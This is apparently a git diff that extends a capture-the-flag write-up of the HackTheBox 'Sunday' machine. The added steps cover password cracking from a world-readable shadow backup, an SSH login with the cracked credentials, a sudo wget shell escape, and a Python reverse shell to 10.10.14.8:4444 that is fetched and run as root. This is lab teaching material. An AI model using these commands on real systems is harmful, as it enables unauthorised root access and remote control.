@@ -71,10 +71,10 @@ hydra -L users.txt -P /usr/share/seclists/Passwords/probable-v2-top1575.txt 10.1
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/75521922-5eea-4e98-8c9a-b44f26b5bd71)
 
 
-## Privilege Escalation:
+## Privilege Escalation: from sunny to sammy
 + We need to escalate our privileges to Sammy.
 + Check **shadow.backup** in **/backup** directory.
-+ It's a backup of the shadow file.
++ It's a backup of the shadow file, and that is world readable.
 ```
 sunny@sunday:/backup$ cat shadow.backup 
 mysql:NP:::::::
@@ -118,12 +118,69 @@ sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/82fae4ab-8672-403b-8bbb-6dacc755fe04)
 
-+ Cracked `sammy`:`cooldude!`
++ **Cracked** `sammy`:`cooldude!`
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/dd51bb99-c289-4229-b878-3db5082ddba4)
 
++ Login ssh `sammy`:`cooldude!`: `ssh sammy@10.10.10.76 -p 22022`
++ Get the user flag.
 
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/ae58cbf1-749c-4d00-b846-98da777ca45c)
+
+## Privilege Escalation: from sammy to root
+
+### Method 1:
++ Run `sudo -ll` command to view the list of allowed commands the user can run as root.
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/36f1c0e0-6503-4515-8f63-25179f3be8b4)
+
++ Check [wget](https://gtfobins.github.io/gtfobins/wget/) on gtfobins.
++ Try [sudo](https://gtfobins.github.io/gtfobins/wget/#sudo)
+```
+TF=$(mktemp)
+chmod +x $TF
+echo -e '#!/bin/sh\n/bin/sh 1>&0' >$TF
+sudo wget --use-askpass=$TF 0
+```
+
++ Get the root shell.
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/4e469a93-aad2-4338-a806-18c7ae8d33c1)
+
+
+### Method 2:
++ On **sunny**'s session, view the list of allowed commands that the user can run with root privileges: `sudo -ll`
++ We don't have write access to the script, so we can't escalate our privileges using it.
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/afd94b35-eb23-48b4-b1ef-2960847d9e3a)
+
++ Pass to **sammy**'s session, and view the list of allowed commands the user can run as root.
++ Create a **rev_shell.py** file on your kali attack vm, and serve it with SimpleHTTPServer.
+```
+#!/usr/bin/python
+import socket
+import subprocess
+import os
+
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("10.10.14.8",4444))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+p=subprocess.call(["/bin/sh","-i"]);
+```
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/7958d23f-6e5a-4568-8bfa-7992f15fed94)
+
++ Download request **rev_shell.py** with wget, using the `-O` option, which will allow us to specify a file to write the wget output to, and it will overwrite that file if it already exists.
+```
+sudo wget http://10.10.14.8:8000/rev_shell.py -O /root/troll
+```
+
++ Run it with sunny: `su sunny`
++ Run: `sudo /root/troll`
 
 # References & Alternatives:
 + https://vvmlist.github.io/#poison
++ https://0xdf.gitlab.io/2018/09/29/htb-sunday.html#6-methods-to-root-using-wget
 + 
